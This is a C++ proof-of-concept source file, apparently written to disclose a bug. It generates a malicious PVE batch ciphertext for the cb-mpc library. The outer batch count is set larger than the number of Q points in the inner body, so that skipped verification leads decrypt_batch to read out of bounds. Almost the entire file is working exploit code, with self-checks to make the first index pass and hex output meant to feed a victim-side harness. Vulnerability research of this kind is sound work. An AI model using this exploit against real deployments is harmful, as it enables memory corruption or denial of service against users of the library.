// ---------------------------------------------------------------------------
// cb-mpc PVE batch (single-recipient) — malicious ciphertext generator
//
// Attacker side only. Produces a serialized PVE batch ciphertext whose outer
// `batch_count` (n) is larger than the number of Q points carried in the inner
// body. `coinbase::api::pve::decrypt_batch()` runs with skip_verify=true, so the
// `Q.size() != n` check that lives in ec_pve_batch_t::verify() is never reached
// and ec_pve_batch_t::restore_from_decrypted() indexes Q[i] for i in [0, n).
//
// The blob is emitted as hex so that the victim-side PoC can consume it with
// public API headers only.
// ---------------------------------------------------------------------------
#include <cstdio>
#include <string>
#include <vector>

#include <cbmpc/api/pve_base_pke.h>
#include <cbmpc/api/pve_batch_single_recipient.h>

// Attacker-side convenience only: these are used to lay out the malicious blob
// bytes and to compute the PVE inner label. An attacker with a hex editor and
// the (public) format description needs none of this.
#include <cbmpc/internal/core/convert.h>
#include <cbmpc/internal/crypto/base.h>
#include <cbmpc/internal/crypto/base_ecc.h>
#include <cbmpc/internal/protocol/pve_base.h>

using namespace coinbase;
using namespace coinbase::crypto;

static const int kKappa = SEC_P_COM;  // 128 rows
static const int kCurveSize = 32;     // P-256
static const int kStatBytes = coinbase::bits_to_bytes(SEC_P_STAT);  // 8

static std::string to_hex(mem_t m) {
  static const char* d = "0123456789abcdef";
  std::string s;
  s.reserve(m.size * 2);
  for (int i = 0; i < m.size; i++) {
    s.push_back(d[m.data[i] >> 4]);
    s.push_back(d[m.data[i] & 0xf]);
  }
  return s;
}

// Mirrors ec_pve_batch_t::convert() field-for-field. This is the inner body
// that ec_pve_batch_t deserializes; `n` is NOT part of it (it comes from the
// outer blob), which is the root of the bug.
struct malicious_body_t {
  std::vector<ecc_point_t> Q;
  buf_t L;
  buf128_t b;
  struct row_t {
    buf_t x_bin, r, c;
  };
  std::vector<row_t> rows;

  malicious_body_t() : rows(kKappa) { b = buf128_t::zero(); }

  void convert(coinbase::converter_t& c) {
    c.convert_vector(Q, coinbase::converter_t::MAX_CONTAINER_ELEMENTS);
    c.convert(L, b);
    for (int i = 0; i < kKappa; i++) {
      c.convert(rows[i].x_bin);
      c.convert(rows[i].r);
      c.convert(rows[i].c);
    }
  }
};

// Mirrors pve_batch_ciphertext_blob_v1_t in src/cbmpc/api/pve_batch_single_recipient.cpp
struct outer_blob_t {
  uint32_t version = 1;
  uint32_t batch_count = 0;
  buf_t ct;
  void convert(coinbase::converter_t& c) { c.convert(version, batch_count, ct); }
};

int main() {
  // ---- victim key material (public API) --------------------------------
  buf_t ek, dk;
  if (coinbase::api::pve::generate_base_pke_rsa_keypair(ek, dk)) {
    printf("keygen failed\n");
    return 1;
  }

  const std::string label_str = "cbmpc-pve-backup-label";
  mem_t label = mem_t::from_string(label_str);

  ecurve_t curve = curve_p256;
  const mod_t& q = curve.order();
  const auto& G = curve.generator();

  // ---- choose the mismatch --------------------------------------------
  // Inner body carries exactly ONE Q point; the outer blob declares n = 64.
  const int n = 64;
  const int kQCount = 1;

  // r01 is the value the victim will recover by decrypting rows[0].c. It seeds
  // the DRBG that produces x0, so we must know it to make index 0 verify.
  buf_t r01(16);
  r01.bzero();

  drbg_aes_ctr_t drbg(r01);
  buf_t x0_source = drbg.gen(n * (kCurveSize + kStatBytes));
  std::vector<bn_t> x0;
  if (bn_t::vector_from_bin(x0_source, n, kCurveSize + kStatBytes, q, x0)) {
    printf("x0 derive failed\n");
    return 1;
  }

  // x[0] = x0[0] + x1[0] must equal the discrete log of Q[0] so that the loop
  // in restore_from_decrypted() survives index 0 and walks off the end at i=1.
  bn_t target = bn_t(12345);
  bn_t x1_0;
  MODULO(q) { x1_0 = target - x0[0]; }

  std::vector<bn_t> x1(n);
  x1[0] = x1_0;
  for (int i = 1; i < n; i++) x1[i] = bn_t(0);

  malicious_body_t body;
  body.Q.resize(kQCount);
  body.Q[0] = target * G;  // matches x[0]; every later index is out of bounds
  body.L = buf_t(label);
  for (int i = 0; i < 128; i++) body.b.set_bit(i, true);  // bi = 1 for every row
  body.rows[0].x_bin = bn_t::vector_to_bin(x1, kCurveSize);  // n * 32 bytes
  body.rows[0].r = buf_t(32);                                // unused when bi = 1
  body.rows[0].r.bzero();

  // Self-check: replicate ec_pve_batch_t::restore_from_decrypted()'s index-0
  // arithmetic so we know the loop survives i = 0 and walks off the end at i = 1.
  {
    std::vector<bn_t> chk_x0, chk_x1;
    drbg_aes_ctr_t d2(r01);
    buf_t src = d2.gen(n * (kCurveSize + kStatBytes));
    bn_t::vector_from_bin(src, n, kCurveSize + kStatBytes, q, chk_x0);
    bn_t::vector_from_bin(body.rows[0].x_bin, n, kCurveSize, q, chk_x1);
    bn_t chk;
    MODULO(q) { chk = chk_x0[0] + chk_x1[0]; }
    printf("# self-check: curve.size()=%d  Q[0]==x[0]*G ? %s\n", curve.size(),
           ((chk * G) == body.Q[0]) ? "yes" : "NO");
  }

  // rows[0].c must decrypt (under the victim's dk) to exactly r01. The label is
  // bound to the *inner* body's Q, which the attacker also controls.
  buf_t inner_label = coinbase::mpc::genPVELabelWithPoint(mem_t(body.L), body.Q);
  buf_t rho(32);
  rho.bzero();
  if (coinbase::api::pve::base_pke_default().encrypt(ek, inner_label, r01, rho, body.rows[0].c)) {
    printf("base pke encrypt failed\n");
    return 1;
  }

  {
    buf_t rt;
    error_t drv = coinbase::api::pve::base_pke_default().decrypt(dk, inner_label, body.rows[0].c, rt);
    printf("# self-check: base_pke round-trip rv=%d plaintext_size=%d (need 16)\n", (int)drv, rt.size());
    printf("# self-check: x_bin size=%d (need %d)\n", body.rows[0].x_bin.size(), n * kCurveSize);
  }

  outer_blob_t blob;
  blob.batch_count = static_cast<uint32_t>(n);
  blob.ct = coinbase::convert(body);
  buf_t ciphertext = coinbase::convert(blob);

  printf("EK %s\n", to_hex(ek).c_str());
  printf("DK %s\n", to_hex(dk).c_str());
  printf("LABEL %s\n", label_str.c_str());
  printf("CT %s\n", to_hex(ciphertext).c_str());
  printf("# declared batch_count(n) = %d, Q points carried = %d\n", n, kQCount);
  return 0;
}
